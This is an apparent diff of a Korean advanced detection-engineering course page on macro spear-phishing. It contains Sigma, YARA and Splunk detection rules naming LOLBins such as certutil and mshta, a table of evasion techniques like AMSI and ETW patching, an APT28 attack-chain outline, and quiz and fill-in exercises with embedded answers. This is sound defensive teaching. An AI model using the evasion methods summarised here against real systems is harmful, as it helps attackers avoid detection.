+    condition: selection_parent and (selection_lolbin or selection_suspicious_args)
+
+level: critical
+tags:
+    - attack.initial_access
+    - attack.t1566.001
+    - attack.defense_evasion
+    - attack.t1218</pre>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">Sigma → Splunk/Elastic 변환</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F"># pySigma CLI로 변환</span>
+$ sigma convert -t splunk -p sysmon rules/office_lolbin.yml
+<span style="color:#9DD9D2">→ 결과 (Splunk SPL):</span>
+ParentImage="*\\WINWORD.EXE" OR ParentImage="*\\EXCEL.EXE"
+| search (Image="*\\certutil.exe" OR Image="*\\mshta.exe" ...)
+
+$ sigma convert -t elasticsearch -p sysmon rules/office_lolbin.yml
+<span style="color:#9DD9D2">→ 결과 (Elasticsearch Query DSL): JSON 형태</span></pre>
+                </div>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">💡 핵심 포인트</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">중급에서 cmd.exe/powershell.exe만 탐지했다면, 고급에서는 <span class="hl-red">공격자가 대안으로 사용하는 모든 LOLBin</span>까지 커버합니다. 하지만 이 접근은 FP(오탐)가 증가할 수 있으므로, 반드시 <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-xs">falsepositives</code> 섹션을 충실히 작성해야 합니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.6 YARA 고급 규칙 ===================== -->
+        <section id="ch6" data-chapter-id="ch6" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-red-600 text-white flex items-center justify-center font-black text-sm shadow">06</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">YARA 고급 규칙</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-red-50 dark:bg-red-900/30 p-4 rounded-xl border border-red-200 dark:border-red-700">
+                    <p class="text-sm font-bold text-red-700 dark:text-red-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">난독화된 매크로 문서를 탐지하기 위한 고급 YARA 규칙(정규식, 조건 로직, 모듈)을 작성합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">난독화 탐지: Chr() 패턴 매칭</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre>rule Obfuscated_VBA_Chr_Concat {
+    meta:
+        description = "Chr() 연결을 통한 VBA 난독화 탐지"
+        author      = "ROOT14 SOC"
+        mitre_att   = "T1027, T1566.001"
+
+    strings:
+        $ole2    = { D0 CF 11 E0 A1 B1 1A E1 }
+        <span style="color:#9DD9D2">// Chr() 3번 이상 연결 패턴 (정규식)</span>
+        $chr_chain = /Chr\(\d+\)\s*&amp;\s*Chr\(\d+\)\s*&amp;\s*Chr\(\d+\)/ nocase
+        <span style="color:#9DD9D2">// 자동 실행 트리거</span>
+        $auto    = /Auto(Open|Close|Exec|_Open)/ nocase
+
+    condition:
+        $ole2 at 0
+        and #chr_chain > 3   <span style="color:#9DD9D2">// Chr() 체인이 3회 이상</span>
+        and $auto
+}</pre>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">엔트로피 기반 탐지</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">난독화/암호화된 코드는 <span class="hl-teal">엔트로피(정보 밀도)</span>가 높습니다. YARA의 <code class="bg-slate-200 dark:bg-slate-700 px-1 rounded text-xs">math</code> 모듈로 파일 또는 섹션의 엔트로피를 계산하여 이상 탐지를 수행합니다.</p>
+
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre>import "math"
+
+rule High_Entropy_VBA_Stream {
+    meta:
+        description = "VBA 스트림의 높은 엔트로피 탐지 (암호화/난독화 의심)"
+
+    strings:
+        $ole2 = { D0 CF 11 E0 A1 B1 1A E1 }
+        $vba  = "VBA" ascii
+
+    condition:
+        $ole2 at 0
+        and $vba
+        and math.entropy(0, filesize) > 6.5  <span style="color:#9DD9D2">// 엔트로피 6.5 이상 → 의심</span>
+}</pre>
+                </div>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">💡 핵심 포인트</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">고급 YARA에서는 단순 문자열 매칭을 넘어 <span class="hl-red">정규식</span>, <span class="hl-blue">출현 횟수(#)</span>, <span class="hl-teal">엔트로피</span>를 조합합니다. 난독화는 특정 문자열을 숨기지만, 난독화 자체의 패턴(Chr 반복, 높은 엔트로피)은 새로운 탐지 포인트가 됩니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.7 우회 공격 재탐지 전략 ===================== -->
+        <section id="ch7" data-chapter-id="ch7" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-red-600 text-white flex items-center justify-center font-black text-sm shadow">07</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">우회 공격 재탐지 전략</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-red-50 dark:bg-red-900/30 p-4 rounded-xl border border-red-200 dark:border-red-700">
+                    <p class="text-sm font-bold text-red-700 dark:text-red-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">공격자의 우회 기법을 역으로 이용하여, 우회 행위 자체를 탐지하는 "메타 탐지" 전략을 설계합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">메타 탐지 원칙: "우회도 흔적을 남긴다"</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300">공격자가 탐지를 우회하면, <span class="hl-red">우회 행위 자체가 새로운 이상 징후</span>를 생성합니다. 예를 들어, AMSI를 패치하면 AMSI 이벤트가 갑자기 사라지는데, 이 "부재"가 탐지 포인트가 됩니다.</p>
+
+                <div class="overflow-x-auto">
+                    <table class="w-full text-xs border-collapse">
+                        <thead><tr class="bg-slate-200 dark:bg-slate-700">
+                            <th class="p-2 text-left font-bold">우회 기법</th>
+                            <th class="p-2 text-left font-bold">생성되는 이상 징후</th>
+                            <th class="p-2 text-left font-bold">재탐지 방법</th>
+                        </tr></thead>
+                        <tbody>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">AMSI 패치</td><td class="p-2">AMSI ETW 이벤트 소실</td><td class="p-2">AMSI 이벤트 부재 알림</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">Sysmon 언로드</td><td class="p-2">Sysmon 서비스 중단</td><td class="p-2">Sysmon heartbeat 모니터링</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">ETW 패치</td><td class="p-2">ntdll.dll 메모리 변조</td><td class="p-2">메모리 무결성 검사 (커널)</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">LOLBin 사용</td><td class="p-2">정상 바이너리의 비정상 인자</td><td class="p-2">CommandLine 이상 탐지</td></tr>
+                            <tr><td class="p-2">프로세스 인젝션</td><td class="p-2">비정상 메모리 할당</td><td class="p-2">Sysmon ID 8,10 + EDR</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">"부재의 탐지" (Absence Detection)</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F"># Splunk: Sysmon heartbeat 부재 탐지 (5분 이상 이벤트 없으면 알림)</span>
+index=sysmon source="WinEventLog:Microsoft-Windows-Sysmon/Operational"
+| stats latest(_time) as last_event by host
+| eval gap = now() - last_event
+| where gap > 300
+| table host, last_event, gap
+
+<span style="color:#F4D06F"># → Sysmon이 5분 이상 이벤트를 생성하지 않는 호스트 = 의심 대상</span></pre>
+                </div>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">💡 핵심 포인트</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">고급 방어자는 "무엇이 있는가"뿐 아니라 <span class="hl-red">"무엇이 없어졌는가"</span>도 탐지합니다. 텔레메트리(Sysmon, AMSI, ETW)의 정상 베이스라인을 구축하고, 이 베이스라인에서 벗어나는 "침묵"을 경보로 전환합니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.8 Detection Engineering ===================== -->
+        <section id="ch8" data-chapter-id="ch8" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-red-600 text-white flex items-center justify-center font-black text-sm shadow">08</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">Detection Engineering 워크플로</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-red-50 dark:bg-red-900/30 p-4 rounded-xl border border-red-200 dark:border-red-700">
+                    <p class="text-sm font-bold text-red-700 dark:text-red-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">Detection Engineering의 체계적 워크플로(가설 → 규칙 작성 → 테스트 → 배포 → 튜닝)를 학습합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">Detection Engineering 5단계</h3>
+                <div class="space-y-3">
+                    <div class="flex items-start gap-3 bg-slate-100 dark:bg-slate-800 p-3 rounded-lg">
+                        <span class="shrink-0 bg-red-600 text-white text-xs font-bold w-7 h-7 flex items-center justify-center rounded-full">1</span>
+                        <div><p class="font-bold text-sm text-slate-700 dark:text-slate-200">가설 수립 (Hypothesis)</p><p class="text-xs text-slate-500 dark:text-slate-400">"T1566.001 공격자가 LOLBin을 사용하면 어떤 로그가 생성될까?" → 위협 인텔리전스 + ATT&CK 매핑</p></div>
+                    </div>
+                    <div class="flex items-start gap-3 bg-slate-100 dark:bg-slate-800 p-3 rounded-lg">
+                        <span class="shrink-0 bg-red-600 text-white text-xs font-bold w-7 h-7 flex items-center justify-center rounded-full">2</span>
+                        <div><p class="font-bold text-sm text-slate-700 dark:text-slate-200">규칙 작성 (Rule Development)</p><p class="text-xs text-slate-500 dark:text-slate-400">Sigma YAML 작성 → pySigma로 SIEM 쿼리 변환 → Git으로 버전 관리</p></div>
+                    </div>
+                    <div class="flex items-start gap-3 bg-slate-100 dark:bg-slate-800 p-3 rounded-lg">
+                        <span class="shrink-0 bg-red-600 text-white text-xs font-bold w-7 h-7 flex items-center justify-center rounded-full">3</span>
+                        <div><p class="font-bold text-sm text-slate-700 dark:text-slate-200">테스트 (Validation)</p><p class="text-xs text-slate-500 dark:text-slate-400">Atomic Red Team으로 공격 시뮬레이션 실행 → 규칙이 탐지하는지 확인</p></div>
+                    </div>
+                    <div class="flex items-start gap-3 bg-slate-100 dark:bg-slate-800 p-3 rounded-lg">
+                        <span class="shrink-0 bg-red-600 text-white text-xs font-bold w-7 h-7 flex items-center justify-center rounded-full">4</span>
+                        <div><p class="font-bold text-sm text-slate-700 dark:text-slate-200">배포 (Deployment)</p><p class="text-xs text-slate-500 dark:text-slate-400">프로덕션 SIEM에 적용 → 초기 1주일 Informational 레벨로 모니터링</p></div>
+                    </div>
+                    <div class="flex items-start gap-3 bg-slate-100 dark:bg-slate-800 p-3 rounded-lg">
+                        <span class="shrink-0 bg-red-600 text-white text-xs font-bold w-7 h-7 flex items-center justify-center rounded-full">5</span>
+                        <div><p class="font-bold text-sm text-slate-700 dark:text-slate-200">튜닝 (Tuning)</p><p class="text-xs text-slate-500 dark:text-slate-400">FP(오탐) 분석 → 화이트리스트 추가 → 탐지율/오탐율 최적화</p></div>
+                    </div>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">DaC (Detection as Code)</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300"><span class="hl-blue">Detection as Code</span>는 탐지 규칙을 소프트웨어 코드처럼 관리하는 접근입니다. Git 리포지토리에 Sigma 규칙을 저장하고, CI/CD 파이프라인으로 자동 테스트·배포합니다.</p>
+
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F">═══ Detection as Code 파이프라인 ═══</span>
+
+detection-rules/
+├── sigma/
+│   ├── T1566.001_office_child_process.yml
+│   ├── T1566.001_office_lolbin.yml
+│   └── T1566.001_amsi_bypass.yml
+├── tests/
+│   ├── T1566.001_atomic_test.yml    <span style="color:#9DD9D2">← Atomic Red Team 테스트</span>
+│   └── expected_alerts.json
+├── .github/workflows/
+│   └── detection-ci.yml             <span style="color:#9DD9D2">← PR 시 자동 검증</span>
+└── deploy/
+    └── push-to-splunk.py            <span style="color:#9DD9D2">← 승인 후 자동 배포</span></pre>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.9 Threat Hunting 기초 ===================== -->
+        <section id="ch9" data-chapter-id="ch9" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-red-600 text-white flex items-center justify-center font-black text-sm shadow">09</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">Threat Hunting 기초</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-red-50 dark:bg-red-900/30 p-4 rounded-xl border border-red-200 dark:border-red-700">
+                    <p class="text-sm font-bold text-red-700 dark:text-red-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">기존 탐지 규칙이 놓칠 수 있는 위협을 능동적으로 찾아내는 Threat Hunting의 개념과 스피어피싱 관련 헌팅 쿼리를 학습합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">탐지(Detection) vs 헌팅(Hunting)</h3>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
+                    <div class="bg-blue-50 dark:bg-blue-900/20 p-4 rounded-lg border border-blue-200 dark:border-blue-700">
+                        <p class="font-bold text-blue-700 dark:text-blue-300 mb-2">Detection (수동적)</p>
+                        <p class="text-slate-600 dark:text-slate-300 text-xs">사전 정의된 규칙이 알림 생성 → SOC 분석관이 조사. "알려진 위협"에 효과적</p>
+                    </div>
+                    <div class="bg-red-50 dark:bg-red-900/20 p-4 rounded-lg border border-red-200 dark:border-red-700">
+                        <p class="font-bold text-red-700 dark:text-red-300 mb-2">Hunting (능동적)</p>
+                        <p class="text-slate-600 dark:text-slate-300 text-xs">가설 기반으로 대량 로그를 탐색 → 규칙이 놓친 이상 발견. "알려지지 않은 위협"에 효과적</p>
+                    </div>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">T1566.001 헌팅 쿼리 예제</h3>
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto">
+<pre><span style="color:#F4D06F"># Hunting Query 1: 비정상 Office 자식 프로세스 (전수 조사)</span>
+index=sysmon EventCode=1
+  (ParentImage="*\\WINWORD.EXE" OR ParentImage="*\\EXCEL.EXE")
+| stats count by Image, CommandLine, host
+| sort -count
+| where count < 5
+<span style="color:#9DD9D2">→ 드물게 발생하는 자식 프로세스 = 의심 대상</span>
+
+<span style="color:#F4D06F"># Hunting Query 2: Office 프로세스의 외부 네트워크 연결</span>
+index=sysmon EventCode=3
+  (Image="*\\WINWORD.EXE" OR Image="*\\EXCEL.EXE")
+  NOT DestinationIp IN ("10.*","172.16.*","192.168.*","127.*")
+| stats count by DestinationIp, DestinationPort, host
+<span style="color:#9DD9D2">→ Office가 직접 외부 IP와 통신하면 비정상</span>
+
+<span style="color:#F4D06F"># Hunting Query 3: 최근 7일 내 매크로 포함 파일 수신</span>
+index=email
+  attachment_name="*.docm" OR attachment_name="*.xlsm"
+| stats count by sender, recipient, attachment_name
+| sort -count</pre>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">헌팅 사이클 (OODA Loop)</h3>
+                <p class="text-sm leading-relaxed text-slate-600 dark:text-slate-300"><span class="hl-blue">Observe</span>(로그 수집) → <span class="hl-teal">Orient</span>(위협 인텔 + 가설) → <span class="hl-yel">Decide</span>(쿼리 설계) → <span class="hl-red">Act</span>(실행 + 결과 분석). 발견된 패턴은 새 탐지 규칙으로 자동화하여 Detection Engineering 파이프라인에 통합합니다.</p>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">💡 핵심 포인트</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">Threat Hunting의 가치는 <span class="hl-red">규칙이 아직 존재하지 않는 위협</span>을 발견하는 것입니다. 헌팅에서 발견된 패턴 → Sigma 규칙 작성 → CI/CD 배포 → 자동 탐지. 이 순환이 조직의 탐지 성숙도를 높입니다.</p>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===================== Ch.10 종합 시나리오 분석 ===================== -->
+        <section id="ch10" data-chapter-id="ch10" class="section-observe mb-16 max-w-4xl mx-auto opacity-0 translate-y-10 transition-all duration-700">
+            <div class="flex items-center gap-3 mb-6">
+                <span class="shrink-0 w-10 h-10 rounded-xl bg-red-600 text-white flex items-center justify-center font-black text-sm shadow">10</span>
+                <h2 class="text-2xl md:text-3xl font-extrabold text-slate-800 dark:text-white">종합 시나리오 분석</h2>
+            </div>
+            <div class="glass-panel rounded-2xl p-6 md:p-8 space-y-6">
+                <div class="bg-red-50 dark:bg-red-900/30 p-4 rounded-xl border border-red-200 dark:border-red-700">
+                    <p class="text-sm font-bold text-red-700 dark:text-red-300">🎯 학습 목표</p>
+                    <p class="text-sm text-slate-600 dark:text-slate-300 mt-1">실제 APT 캠페인 시나리오를 기반으로, 공격 체인 전체를 분석하고 각 단계의 탐지·우회·재탐지 전략을 종합적으로 평가합니다.</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">시나리오: APT28의 FANCY BEAR 캠페인</h3>
+                <div class="bg-slate-100 dark:bg-slate-800 p-4 rounded-xl text-xs space-y-2">
+                    <p class="font-bold text-slate-700 dark:text-slate-200">상황: 방위산업체 직원 대상 스피어피싱</p>
+                    <p class="text-slate-600 dark:text-slate-300">1. 정찰: LinkedIn에서 타깃 직원의 업무 분야 파악</p>
+                    <p class="text-slate-600 dark:text-slate-300">2. 메일 발송: 방산 컨퍼런스 초대장.docm (매크로 포함)</p>
+                    <p class="text-slate-600 dark:text-slate-300">3. 매크로: Chr() 난독화 + certutil 다운로더 (ASR/cmd.exe 우회)</p>
+                    <p class="text-slate-600 dark:text-slate-300">4. 2차 페이로드: DLL 사이드로딩 (rundll32 사용)</p>
+                    <p class="text-slate-600 dark:text-slate-300">5. C2: HTTPS + 도메인 프론팅 (CDN 경유)</p>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">단계별 탐지/우회/재탐지 매트릭스</h3>
+                <div class="overflow-x-auto">
+                    <table class="w-full text-[10px] border-collapse">
+                        <thead><tr class="bg-slate-200 dark:bg-slate-700">
+                            <th class="p-2 text-left">단계</th>
+                            <th class="p-2 text-left">중급 탐지</th>
+                            <th class="p-2 text-left">공격자 우회</th>
+                            <th class="p-2 text-left">고급 재탐지</th>
+                        </tr></thead>
+                        <tbody>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">이메일</td><td class="p-2">SPF/DKIM</td><td class="p-2">합법 메일서비스 사용</td><td class="p-2">첨부파일 샌드박스 강화</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">매크로</td><td class="p-2">YARA 문자열</td><td class="p-2">Chr() 난독화</td><td class="p-2">YARA 엔트로피+Chr패턴</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">실행</td><td class="p-2">ASR cmd/ps 차단</td><td class="p-2">certutil LOLBin</td><td class="p-2">Sigma LOLBin 규칙</td></tr>
+                            <tr class="border-b border-slate-200 dark:border-slate-700"><td class="p-2">지속성</td><td class="p-2">Sysmon ID 1</td><td class="p-2">DLL 사이드로딩</td><td class="p-2">Sysmon ID 7 비정상 DLL</td></tr>
+                            <tr><td class="p-2">C2</td><td class="p-2">IP 블랙리스트</td><td class="p-2">도메인 프론팅</td><td class="p-2">JA3/JA3S TLS 핑거프린트</td></tr>
+                        </tbody>
+                    </table>
+                </div>
+
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white">과정 총정리: 중급 → 고급 성장 포인트</h3>
+                <div class="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
+                    <div class="bg-blue-50 dark:bg-blue-900/20 p-3 rounded-lg border border-blue-200 dark:border-blue-700">
+                        <p class="font-bold text-blue-700 dark:text-blue-300">중급에서 배운 것</p>
+                        <p class="text-slate-600 dark:text-slate-300 mt-1">단일 탐지 도구(Sysmon, YARA, Sigma)의 개별 사용법</p>
+                    </div>
+                    <div class="bg-red-50 dark:bg-red-900/20 p-3 rounded-lg border border-red-200 dark:border-red-700">
+                        <p class="font-bold text-red-700 dark:text-red-300">고급에서 배운 것</p>
+                        <p class="text-slate-600 dark:text-slate-300 mt-1">우회 기법 이해 + 메타 탐지 + Detection Engineering 워크플로</p>
+                    </div>
+                </div>
+
+                <div class="bg-amber-50 dark:bg-amber-900/20 p-4 rounded-xl border border-amber-200 dark:border-amber-700 text-sm">
+                    <p class="font-bold text-amber-700 dark:text-amber-300">🎓 다음 단계: Expert</p>
+                    <p class="text-slate-600 dark:text-slate-300 mt-1">Expert 과정에서는 Purple Team 운용, CVE 취약점 분석(CVE-2021-40444, CVE-2022-30190), 제로데이 연구 방법론, 자체 탐지 프레임워크 설계를 학습합니다.</p>
+                </div>
+
+                <!-- ════════ 인터랙티브: Sigma 규칙 빈칸 채우기 ════════ -->
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white mt-8">🧩 인터랙티브: Sigma 규칙 빈칸 채우기</h3>
+                <p class="text-sm text-slate-600 dark:text-slate-300">아래 Sigma 규칙의 빈칸에 올바른 값을 드래그하여 채워 넣으세요. Office 앱이 LOLBin을 실행하는 패턴을 탐지하는 규칙입니다.</p>
+
+                <div class="terminal-bg rounded-xl p-4 text-xs overflow-x-auto" id="sigma-fill-area">
+<pre>title: Office Application Spawns LOLBin
+status: experimental
+logsource:
+    category: <span class="code-blank" id="blank1" data-answer="process_creation" ondrop="dropBlank(event)" ondragover="event.preventDefault()">?</span>
+    product: <span class="code-blank" id="blank2" data-answer="windows" ondrop="dropBlank(event)" ondragover="event.preventDefault()">?</span>
+
+detection:
+    selection_parent:
+        <span class="code-blank" id="blank3" data-answer="ParentImage|endswith" ondrop="dropBlank(event)" ondragover="event.preventDefault()">?</span>:
+            - '\WINWORD.EXE'
+            - '\EXCEL.EXE'
+
+    selection_child:
+        Image|endswith:
+            - '\certutil.exe'
+            - '<span class="code-blank" id="blank4" data-answer="mshta.exe" ondrop="dropBlank(event)" ondragover="event.preventDefault()">?</span>'
+            - '\regsvr32.exe'
+
+    condition: <span class="code-blank" id="blank5" data-answer="selection_parent and selection_child" ondrop="dropBlank(event)" ondragover="event.preventDefault()">?</span>
+
+level: <span class="code-blank" id="blank6" data-answer="critical" ondrop="dropBlank(event)" ondragover="event.preventDefault()">?</span></pre>
+                </div>
+
+                <!-- 드래그 가능한 선택지 -->
+                <div class="flex flex-wrap gap-2 mt-4" id="sigma-choices">
+                    <span class="drag-item bg-blue-100 dark:bg-blue-900/40 text-blue-700 dark:text-blue-300 px-3 py-1.5 rounded-lg text-xs font-mono border border-blue-300 dark:border-blue-600" draggable="true" ondragstart="dragStart(event)" data-value="process_creation">process_creation</span>
+                    <span class="drag-item bg-blue-100 dark:bg-blue-900/40 text-blue-700 dark:text-blue-300 px-3 py-1.5 rounded-lg text-xs font-mono border border-blue-300 dark:border-blue-600" draggable="true" ondragstart="dragStart(event)" data-value="windows">windows</span>
+                    <span class="drag-item bg-blue-100 dark:bg-blue-900/40 text-blue-700 dark:text-blue-300 px-3 py-1.5 rounded-lg text-xs font-mono border border-blue-300 dark:border-blue-600" draggable="true" ondragstart="dragStart(event)" data-value="ParentImage|endswith">ParentImage|endswith</span>
+                    <span class="drag-item bg-blue-100 dark:bg-blue-900/40 text-blue-700 dark:text-blue-300 px-3 py-1.5 rounded-lg text-xs font-mono border border-blue-300 dark:border-blue-600" draggable="true" ondragstart="dragStart(event)" data-value="mshta.exe">mshta.exe</span>
+                    <span class="drag-item bg-blue-100 dark:bg-blue-900/40 text-blue-700 dark:text-blue-300 px-3 py-1.5 rounded-lg text-xs font-mono border border-blue-300 dark:border-blue-600" draggable="true" ondragstart="dragStart(event)" data-value="selection_parent and selection_child">selection_parent and selection_child</span>
+                    <span class="drag-item bg-blue-100 dark:bg-blue-900/40 text-blue-700 dark:text-blue-300 px-3 py-1.5 rounded-lg text-xs font-mono border border-blue-300 dark:border-blue-600" draggable="true" ondragstart="dragStart(event)" data-value="critical">critical</span>
+                    <!-- 오답 보기 (디스트랙터) -->
+                    <span class="drag-item bg-slate-100 dark:bg-slate-700 text-slate-500 dark:text-slate-400 px-3 py-1.5 rounded-lg text-xs font-mono border border-slate-300 dark:border-slate-600" draggable="true" ondragstart="dragStart(event)" data-value="network_connection">network_connection</span>
+                    <span class="drag-item bg-slate-100 dark:bg-slate-700 text-slate-500 dark:text-slate-400 px-3 py-1.5 rounded-lg text-xs font-mono border border-slate-300 dark:border-slate-600" draggable="true" ondragstart="dragStart(event)" data-value="Image|contains">Image|contains</span>
+                    <span class="drag-item bg-slate-100 dark:bg-slate-700 text-slate-500 dark:text-slate-400 px-3 py-1.5 rounded-lg text-xs font-mono border border-slate-300 dark:border-slate-600" draggable="true" ondragstart="dragStart(event)" data-value="medium">medium</span>
+                </div>
+
+                <div class="flex gap-3 mt-4">
+                    <button onclick="checkSigmaFill()" class="px-6 py-2.5 bg-red-600 hover:bg-red-700 text-white font-bold rounded-xl transition-colors text-sm">채점하기</button>
+                    <button onclick="resetSigmaFill()" class="px-6 py-2.5 bg-slate-300 dark:bg-slate-600 hover:bg-slate-400 dark:hover:bg-slate-500 text-slate-700 dark:text-white font-bold rounded-xl transition-colors text-sm">초기화</button>
+                </div>
+                <div id="sigma-fill-result" class="hidden"></div>
+
+                <!-- ════════ 종합 퀴즈 5문항 ════════ -->
+                <h3 class="text-lg font-bold text-slate-800 dark:text-white mt-10">📝 고급 종합 퀴즈</h3>
+                <p class="text-sm text-slate-600 dark:text-slate-300 mb-4">Ch.1~Ch.9에서 배운 EDR 우회, 난독화, Detection Engineering 내용을 평가합니다. 5문항 중 4문항 이상 정답 시 통과입니다.</p>
+
+                <!-- AQ1 -->
+                <div class="space-y-3 mb-6">
+                    <p class="text-sm font-bold text-slate-800 dark:text-white">Q1. AMSI 바이패스의 핵심 원리는?</p>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq1" value="1" class="mt-1 shrink-0"><span>Windows 방화벽 규칙을 비활성화한다</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq1" value="2" class="mt-1 shrink-0"><span>AmsiScanBuffer 함수를 패치하여 항상 Clean을 반환시킨다</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq1" value="3" class="mt-1 shrink-0"><span>PowerShell 실행 정책을 Unrestricted로 변경한다</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq1" value="4" class="mt-1 shrink-0"><span>Windows Defender 서비스를 중지한다</span></label>
+                </div>
+
+                <!-- AQ2 -->
+                <div class="space-y-3 mb-6">
+                    <p class="text-sm font-bold text-slate-800 dark:text-white">Q2. LOLBin(Living-off-the-Land Binary)의 핵심 특징은?</p>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq2" value="1" class="mt-1 shrink-0"><span>공격자가 직접 컴파일한 악성 바이너리</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq2" value="2" class="mt-1 shrink-0"><span>Windows에 기본 설치된 서명된 바이너리를 악용</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq2" value="3" class="mt-1 shrink-0"><span>Linux 전용 공격 도구</span></label>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq2" value="4" class="mt-1 shrink-0"><span>오픈소스 침투 테스트 프레임워크</span></label>
+                </div>
+
+                <!-- AQ3 -->
+                <div class="space-y-3 mb-6">
+                    <p class="text-sm font-bold text-slate-800 dark:text-white">Q3. "부재의 탐지(Absence Detection)"란?</p>
+                    <label class="flex items-start gap-2 text-sm cursor-pointer"><input type="radio" name="aq3" value="1" class="mt-1 shrink-0"><span>악성 파일이 존재하지 않는 것을 확인하는 것</span></label>
